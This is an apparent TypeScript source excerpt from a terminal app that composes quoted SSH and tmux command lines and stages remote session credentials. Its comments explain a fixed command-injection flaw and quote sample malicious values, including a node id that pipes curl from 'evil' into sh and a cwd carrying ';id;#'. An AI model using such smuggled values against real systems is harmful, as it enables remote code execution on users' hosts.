 * so the skill was inert on every SSH node even once it was installed there.
 * `agentId` is omitted for plain (non-agent) terminals, which get neither pair.
 */
export function remoteHookEnvArgs(
  endpointPath: string,
  nodeId: string,
  version: string,
  agentId?: string
): string[] {
  const env = [
    '-e',
    `NODETERM_HOOK_ENDPOINT=${endpointPath}`,
    '-e',
    `NODETERM_NODE_ID=${nodeId}`,
    '-e',
    `NODETERM_HOOK_VERSION=${version}`
  ]
  if (agentId) {
    env.push('-e', `NODETERM_AGENT_ID=${agentId}`)
    if (canControlCanvas(agentId)) env.push('-e', 'NODETERM_CANVAS_CONTROL=1')
  }
  return env
}
/** Contents of the remote endpoint env file the managed hook script sources (unix-socket transport). */
export function remoteEndpointFileContents(
  sock: string,
  token: string,
  version: string,
  tokenDir: string
): string {
  // Every value is `posixQuote`d for the same reason as the local writer (issue #351): the managed
  // script SOURCES this file under /bin/sh, so an unquoted space or shell metachar in the socket
  // path, token, or token dir would break the source. Remote paths rarely carry spaces, but the
  // token can hold any byte, and the guarantee should not depend on the host's home layout.
  return (
    `NODETERM_HOOK_SOCK=${posixQuote(sock)}\n` +
    `NODETERM_HOOK_TOKEN=${posixQuote(token)}\n` +
    `NODETERM_HOOK_VERSION=${posixQuote(version)}\n` +
    // The REMOTE token dir ($HOME/.nodeterm/node-tokens on the host), not ours. The host stores
    // per-node tokens only; it never holds a secret and can never mint.
    `NODETERM_NODE_TOKEN_DIR=${posixQuote(tokenDir)}\n`
  )
}

/**
 * The remote PTY program is `ssh <childArgs> host -t '<remoteTmuxCommand>'`. `extraEnv` is an
 * already-built list of tmux `-e KEY=VALUE` pairs (e.g. from `remoteHookEnvArgs`) spliced into
 * the `new-session` command right after `-A`, mirroring the local tmux `-e` placement.
 *
 * SECURITY — every token is `posixQuote`d, including the `-e` flags themselves (quoting a flag is
 * a no-op to the shell, and hard-coding "even indices are flags" would be an assumption about a
 * caller's array shape rather than a property of this function). This is NOT decoration: the
 * result is ONE SHELL LINE handed to the remote user's login shell, and the values here carry the
 * RAW node id (`NODETERM_NODE_ID`) and the managed-account config dir — both of which come out of
 * `.nodeterm/project.json`, a file that travels in a cloned or shared repo and is written on
 * remote hosts. Spliced unquoted (as this did until 2026-08), a node id of
 * `n1;curl http://evil/x|sh;#` ended the tmux command and ran the rest as the SSH user the moment
 * the victim opened that node. Everything else in `remoteTmuxCommand` was already quoted; this was
 * the one gap. See control-master.injection.test.ts.
 */
export function remoteTmuxPtyArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  remoteCwd: string,
  program?: string,
  programArgs?: string[],
  extraEnv: string[] = [],
  confPath?: string,
  sessionEnv?: RemoteSessionEnv
): string[] {
  let cmd = remoteTmuxCommand({ sessionId, remoteCwd, program, programArgs, socket: RMT_TMUX_SOCKET, confPath })
  if (extraEnv.length)
    // The replacement is a FUNCTION, not a string. This is load-bearing and not a style choice:
    // in a STRING replacement `$'`, `` $` ``, `$&` and `$$` are expansion patterns, and `$'`
    // splices the text FOLLOWING the match — `-s '<session>' -c '<cwd>' '<program>' '<args>'` —
    // straight INSIDE the single-quoted token being built. That inverts the quote parity of that
    // copy and un-quotes everything `remoteTmuxCommand` had carefully quoted, so an agent id of
    // `claude$'` plus a project cwd of `/srv/app;id;#` (both from the same `.nodeterm/project.json`)
    // was remote code execution EVEN WITH the posixQuote above. A function replacement is never
    // pattern-expanded, so the quoted bytes land verbatim. See control-master.injection.test.ts.
    cmd = cmd.replace('new-session -A ', () => `new-session -A ${extraEnv.map(posixQuote).join(' ')} `)
  cmd = tmuxOrExplain(cmd, remoteCwd)
  if (sessionEnv) cmd = `${remoteSessionEnvPrologue(sessionEnv, confPath)}${cmd}`
  // The PATH prologue goes at the very FRONT of the composed line: the session-env prologue's own
  // tmux calls (start-server / show-options) and the `command -v tmux` guard must resolve the
  // binary the same way new-session does.
  return ['-t', ...childArgs(conn, controlPath, tmuxCmd(cmd))]
}

/** What a tmux-less remote loses, told to the user IN the pane. English + apostrophe-free: each
 *  line is embedded as one single-quoted printf argument in the remote shell line. */
const REMOTE_TMUX_MISSING_LINES = [
  'nodeterm: tmux was not found on this host.',
  'nodeterm runs remote terminals inside tmux so they survive disconnects, app restarts and project switches.',
  'Install tmux on the host (brew install tmux / apt install tmux / dnf install tmux) and reopen this terminal.',
  'Starting a plain shell instead - it will NOT persist when this terminal closes.'
]

/**
 * Wrap the interactive remote tmux command so a host WITHOUT tmux gets a readable explanation and
 * a usable plain login shell, instead of the raw `zsh:1: command not found: tmux` that closed the
 * pane immediately (issue #449). Runs after the PATH widening, so it only fires when tmux is
 * genuinely absent from PATH + every known install dir. The fallback shell is the honest local
 * analogue: `PtyManager` falls back to a plain shell when the LOCAL tmux is unavailable too.
 * `cd` first (best-effort) so the shell at least opens in the node's cwd; `${SHELL:-sh}` because
 * an exec channel without SHELL set should still produce a prompt rather than exec ''.
 */
function tmuxOrExplain(tmuxCommand: string, remoteCwd: string): string {
  const msg = REMOTE_TMUX_MISSING_LINES.map(posixQuote).join(' ')
  // The `;` separators are SPACE-PADDED on purpose: the tmux command ends in a single-quoted
  // token, and `'…';` glues the separator onto that token in the injection tests' shell parser
  // (a real sh splits them, but the padded form is equally valid and keeps the parse exact).
  return (
    `if command -v tmux >/dev/null 2>&1 ; then ${tmuxCommand} ; else ` +
    `printf '%s\\n' '' ${msg} '' ; cd ${quoteRemotePath(remoteCwd)} 2>/dev/null ; ` +
    `exec "\${SHELL:-sh}" -l ; fi`
  )
}

/** Credentials for a remote session, delivered WITHOUT argv: a 0600 file (staged over the
 *  ControlMaster, content via stdin) that the remote command sources into the tmux client's env
 *  and deletes, plus the key NAMES (never values) the remote server's `update-environment` must
 *  learn at runtime — the conf bakes the fixed gateway list, but a custom agent's keys are
 *  user-defined. See session-env.ts for the whole design. */
export interface RemoteSessionEnv {
  /** Absolute remote path of the staged env file (built from the validated remote $HOME). */
  file: string
  /** Env names OUTSIDE the conf-baked gateway list to append to `update-environment`. */
  extraKeys: string[]
}

/** The shell prologue spliced before the remote tmux command. POSIX-sh only, one line. The
 *  wait-loop bridges the staging race (the upload is fire-and-forget from a synchronous spawn
 *  path); its budget is 40×50ms = 2s, after which the launch proceeds env-less and the agent
 *  fails loudly in the pane — fail-open never leaks and never wedges a terminal on a dead
 *  upload. The `rm -f` runs unconditionally so a late-landing file cannot linger at rest. */
function remoteSessionEnvPrologue(sessionEnv: RemoteSessionEnv, confPath?: string): string {
  const f = posixQuote(sessionEnv.file)
  const t = `tmux -L ${RMT_TMUX_SOCKET}`
  const parts: string[] = []
  // Names only ever come from isSafeEnvName-shaped keys, but this builder is exported territory —
  // re-filter at the splice point, the same idiom every other remote builder here uses.
  const keys = sessionEnv.extraKeys.filter((k) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(k))
  if (keys.length) {
    // The option must exist on the server BEFORE new-session copies the client env, so start the
    // server (a no-op when warm) with the same conf new-session would use. The grep guard keeps a
    // long-lived server's array from accumulating one duplicate per spawn.
    parts.push(`${t}${confPath ? ` -f ${posixQuote(confPath)}` : ''} start-server 2>/dev/null;`)
    for (const k of keys) {
      parts.push(
        `${t} show-options -g update-environment 2>/dev/null | grep -q ' ${k}$' || ${t} set-option -ga update-environment ${k} 2>/dev/null;`
      )
    }
  }
  parts.push(
    `_nte=0; while [ ! -f ${f} ] && [ "$_nte" -lt 40 ]; do sleep 0.05; _nte=$((_nte+1)); done;`,
    `[ -f ${f} ] && . ${f} >/dev/null 2>&1; rm -f ${f};`
  )
  return parts.join(' ') + ' '
}
